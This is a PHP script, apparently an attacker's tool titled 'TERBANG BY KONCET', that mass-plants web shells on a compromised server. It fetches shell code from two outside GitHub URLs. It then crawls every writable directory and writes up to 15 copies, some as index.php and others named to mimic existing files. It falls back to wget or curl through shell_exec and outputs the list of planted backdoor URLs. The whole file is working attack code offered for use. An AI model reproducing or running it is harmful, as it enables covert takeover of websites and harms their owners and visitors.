<?php
if (!isset($_GET['run'])) {
?>
<!DOCTYPE html>
<html>
<head>
    <title>TERBANG BY KONCET</title>
    <style>
        body { font-family: monospace; background: #111; color: #eee; padding: 20px; text-align: center; }
        button { padding: 10px 20px; background: #333; color: #fff; border: 1px solid #555; cursor: pointer; font-size: 20px; }
        button:hover { background: #444; }
    </style>
</head>
<body>
    <h2>TERBANG BY KONCET</h2>
    <form method="get">
        <button type="submit" name="run" value="1">RUN</button>
    </form>
</body>
</html>
<?php
exit;
}

// === CONFIG ===
$shell_urls = [
    "https://raw.githubusercontent.com/kembarbaru120000/213/refs/heads/main/versi_sal.php",
    "https://raw.githubusercontent.com/kembarbaru120000/213/refs/heads/main/silence.php"
];

$total_shells = 15;
$index_shells = 5;

$chosen_shells = [];
for ($i = 0; $i < $total_shells; $i++) {
    $chosen_shells[] = $shell_urls[array_rand($shell_urls)];
}

$shell_contents = [];
foreach (array_unique($chosen_shells) as $url) {
    $content = @file_get_contents($url);
    if ($content) {
        $shell_contents[$url] = $content;
    }
}

function getAllDirs($base) {
    $dirs = [];
    $items = @scandir($base);
    if (!$items) return $dirs;
    foreach ($items as $item) {
        if ($item === "." || $item === "..") continue;
        $path = $base . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path) && is_writable($path)) {
            $dirs[] = $path;
            $dirs = array_merge($dirs, getAllDirs($path));
        }
    }
    return $dirs;
}

function getMimicName($folder) {
    $files = @array_filter(scandir($folder), fn($f) => is_file($folder . DIRECTORY_SEPARATOR . $f));
    if (empty($files)) return "shell_" . rand(100, 999) . ".php";
    $chosen = $files[array_rand($files)];
    $parts = pathinfo($chosen);
    return $parts['filename'] . "_" . rand(10, 99) . ".php";
}

function try_upload($path, $content) {
    // 1. Default
    if (@file_put_contents($path, $content)) return true;

    // 2. Wget
    $tmpFile = "/tmp/" . uniqid() . ".txt";
    file_put_contents($tmpFile, $content);
    $cmd = "wget -q -O " . escapeshellarg($path) . " " . escapeshellarg("file://$tmpFile");
    @shell_exec($cmd);
    if (file_exists($path)) {
        unlink($tmpFile);
        return true;
    }

    // 3. Curl
    $cmd2 = "curl -s -o " . escapeshellarg($path) . " " . escapeshellarg("file://$tmpFile");
    @shell_exec($cmd2);
    unlink($tmpFile);
    return file_exists($path);
}

$base_url = ($_SERVER['REQUEST_SCHEME'] ?? 'http') . '://' . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']);
$base_dir = __DIR__;
$dirs = getAllDirs($base_dir);
shuffle($dirs);

$output = [];
$index_uploaded = 0;
$uploaded = 0;
$used_dirs = [];

foreach ($dirs as $dir) {
    if ($uploaded >= $total_shells) break;
    sleep(1); // Delay 1 detik tiap upload

    $shell_url = $chosen_shells[$uploaded];
    $content = $shell_contents[$shell_url] ?? null;
    if (!$content || in_array($dir, $used_dirs)) continue;

    $used_dirs[] = $dir;
    $filename = "";

    if ($index_uploaded < $index_shells && !file_exists($dir . "/index.php")) {
        $filename = "index.php";
        $index_uploaded++;
    } else {
        $filename = getMimicName($dir);
    }

    $path = $dir . DIRECTORY_SEPARATOR . $filename;
    if (try_upload($path, $content)) {
        $relative_path = str_replace($base_dir, '', $path);
        $output[] = $base_url . $relative_path;
        $uploaded++;
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>HASIL UPLOAD SHELL</title>
    <style>
        body { font-family: monospace; background: #111; color: #eee; padding: 20px; }
        h2 { color: #f33; }
        textarea { width: 100%; height: 200px; background: #222; color: #0f0; border: none; padding: 10px; margin-bottom: 10px; }
        button { padding: 10px 20px; background: #333; color: #fff; border: 1px solid #555; cursor: pointer; }
        button:hover { background: #444; }
    </style>
</head>
<body>
    <h2>HASIL (<?= count($output) ?> BERHASIL)</h2>
    <textarea id="all"><?= implode("\n", $output) ?></textarea>
    <button onclick="copyText('all')">Copy All</button>
    <script>
        function copyText(id) {
            let textarea = document.getElementById(id);
            textarea.select();
            document.execCommand("copy");
            alert("Copied to clipboard!");
        }
    </script>
</body>
</html>
